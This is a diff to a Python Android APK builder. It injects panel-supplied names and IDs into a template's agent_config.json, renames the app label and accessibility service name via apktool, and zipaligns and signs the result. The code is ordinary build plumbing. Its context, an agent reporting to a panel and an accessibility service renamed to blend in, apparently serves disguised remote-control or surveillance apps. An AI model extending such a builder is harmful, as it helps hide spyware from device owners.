@@ -25,6 +25,9 @@ B. **占位包（回退）** —— 找不到模板时走 `_build_stub_apk()`：
 
 import hashlib, io, json, os, struct, time, zipfile, zlib
 
+# 仓库根目录（tools/apktool.jar 等工具都挂在它下面）
+ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+
 # ---------------------------------------------------------------- AXML
 
 
@@ -734,6 +737,71 @@ def _write_apk_zip(entries, out_path):
             z.writestr(zi, data)
 
 
+
+def _patch_app_label(apk_path, label):
+    """把清单里的应用名（@string/app_name）改成面板填的名字。
+
+    assets/agent_config.json 只能改"上报给面板的名字"，手机设置里看到的
+    仍然是 APK 清单 label（模板默认 love）。这里用 apktool 解包→改 strings.xml→回编译，
+    这一步失败不影响主流程（返回原包）。
+    """
+    label = (label or '').strip()
+    if not label:
+        return apk_path
+    import shutil as _sh
+    import subprocess as _sp
+    import tempfile
+    java = _sh.which('java')
+    jar = os.path.join(ROOT, 'tools', 'apktool.jar')
+    if not java or not os.path.isfile(jar):
+        return apk_path
+    work = tempfile.mkdtemp(prefix='label_')
+    try:
+        dec = os.path.join(work, 'dec')
+        r = _sp.run([java, '-jar', jar, 'd', '-f', '-s', '-o', dec, apk_path],
+                    capture_output=True, text=True, timeout=300)
+        if r.returncode != 0:
+            print('[label] apktool d 失败：%s' % (r.stderr or '')[-200:], flush=True)
+            return apk_path
+        res_dir = os.path.join(dec, 'res', 'values')
+        os.makedirs(res_dir, exist_ok=True)
+        strings = os.path.join(res_dir, 'strings.xml')
+        if os.path.isfile(strings):
+            with open(strings, encoding='utf-8') as fh:
+                xml = fh.read()
+        else:
+            xml = '<?xml version="1.0" encoding="utf-8"?>\n<resources>\n</resources>\n'
+        import re as _re
+        esc = label.replace('&', '&amp;').replace('<', '&lt;')
+        if 'name="app_name"' in xml:
+            xml = _re.sub(r'<string name="app_name">.*?</string>',
+                          '<string name="app_name">%s</string>' % esc, xml, flags=_re.S)
+        else:
+            xml = xml.replace('</resources>', '    <string name="app_name">%s</string>\n</resources>' % esc)
+        # 无障碍服务名也跟着用同一个名字（否则"设置→无障碍"里还是模板默认值）
+        if 'name="accessibility_service_name"' in xml:
+            xml = _re.sub(r'<string name="accessibility_service_name">.*?</string>',
+                          '<string name="accessibility_service_name">%s</string>' % esc, xml, flags=_re.S)
+        else:
+            xml = xml.replace('</resources>',
+                              '    <string name="accessibility_service_name">%s</string>\n</resources>' % esc)
+        with open(strings, 'w', encoding='utf-8') as fh:
+            fh.write(xml)
+        out = os.path.join(work, 'out.apk')
+        r2 = _sp.run([java, '-jar', jar, 'b', '-f', '-o', out, dec],
+                     capture_output=True, text=True, timeout=300)
+        if r2.returncode != 0 or not os.path.isfile(out):
+            print('[label] apktool b 失败：%s' % (r2.stderr or '')[-200:], flush=True)
+            return apk_path
+        print('[label] 应用名已改为 %s' % label, flush=True)
+        return out
+    except Exception as e:
+        print('[label] 改应用名异常：%s' % e, flush=True)
+        return apk_path
+    finally:
+        pass
+
+
 def _build_from_template(cfg, out_path, icon_path, template, stage):
     """模板注入：真清单/真 dex/真资源 + 注入配置 + v2 真签名。"""
     # 1) 读取构建配置
@@ -797,6 +865,42 @@ def _build_from_template(cfg, out_path, icon_path, template, stage):
                                              indent=1).encode('utf-8'),
         'assets/app_url.txt': str(cfg.get('appurl') or '').encode('utf-8'),
     }
+
+    # 5b) 3.x（Gradle 工程出来的模板）：配置在 assets/agent_config.json，
+    #     面板填的应用名 / APK ID / 包名 / 首页地址必须写进这个文件，
+    #     否则打出来的包永远叫模板默认的 "love"、首页也还是模板默认值。
+    old_cfg_entry = dict(entries).get('assets/agent_config.json')
+    if old_cfg_entry:
+        try:
+            ac = json.loads(old_cfg_entry.decode('utf-8'))
+        except Exception:
+            ac = {}
+        src_cfg = inject_cfg if isinstance(inject_cfg, dict) else {}
+        def _pick(*keys):
+            for k in keys:
+                v = src_cfg.get(k) or cfg.get(k)
+                if v:
+                    return str(v).strip()
+            return ''
+        name = _pick('appname', 'appName')
+        if name:
+            ac['appName'] = name
+        apk_id = _pick('apkId', 'apkid')
+        if apk_id:
+            ac['apkId'] = apk_id
+        pkg = _pick('packageName', 'package', 'appid')
+        if pkg:
+            ac['packageName'] = pkg
+        batch = _pick('batch')
+        if batch:
+            ac['batch'] = batch
+        home = _pick('appurl', 'homeUrl', 'homepage')
+        if home:
+            ac['homepage'] = home
+        ver = _pick('appversion', 'apkVersion')
+        if ver:
+            ac['version'] = ver.lstrip('vV')
+        inject['assets/agent_config.json'] = json.dumps(ac, ensure_ascii=False, indent=2).encode('utf-8')
     replaced = set()
     new_entries = []
     for name, data in entries:
@@ -814,11 +918,43 @@ def _build_from_template(cfg, out_path, icon_path, template, stage):
     key, cert = _build_signer()
     tmp_unsigned = out_path + '.unsigned'
     _write_apk_zip(_v1_sign_entries(new_entries, key, cert), tmp_unsigned)
-    signature_note = _sign_apk(tmp_unsigned, out_path, key, cert)
+
+    # 改手机设置里看到的那个应用名（清单 label），失败则保持原样
     try:
-        os.remove(tmp_unsigned)
-    except OSError:
-        pass
+        _lbl = str((inject_cfg or {}).get('appname') or cfg.get('appname') or '').strip()
+        if _lbl:
+            _patched = _patch_app_label(tmp_unsigned, _lbl)
+            if _patched != tmp_unsigned:
+                tmp_unsigned = _patched
+    except Exception as _e:
+        print('[label] 跳过：%s' % _e, flush=True)
+
+    # Android 11+ 要求 resources.arsc 未压缩且 4 字节对齐，否则安装直接失败：
+    #   INSTALL_PARSE_FAILED ... requires the resources.arsc ... uncompressed and aligned
+    # zipfile 只能保证"未压缩"，对齐必须靠 zipalign（服务器 /usr/local/bin/zipalign）
+    zip_ready = tmp_unsigned
+    try:
+        import shutil as _sh
+        import subprocess as _sp
+        zp = _sh.which('zipalign') or '/usr/local/bin/zipalign'
+        if os.path.isfile(zp):
+            aligned = out_path + '.zipped'
+            r = _sp.run([zp, '-f', '-p', '4', tmp_unsigned, aligned],
+                        capture_output=True, text=True, timeout=180)
+            if r.returncode == 0 and os.path.isfile(aligned):
+                zip_ready = aligned
+            else:
+                print('[build] zipalign 失败（继续用未对齐包）：%s' % (r.stderr or '')[:200], flush=True)
+    except Exception as e:
+        print('[build] zipalign 异常（继续用未对齐包）：%s' % e, flush=True)
+
+    signature_note = _sign_apk(zip_ready, out_path, key, cert)
+    for tmp in (tmp_unsigned, out_path + '.zipped'):
+        try:
+            if os.path.isfile(tmp):
+                os.remove(tmp)
+        except OSError:
+            pass
     if not os.path.isfile(out_path):
         raise RuntimeError('签名后没有产物：%s' % signature_note)
 
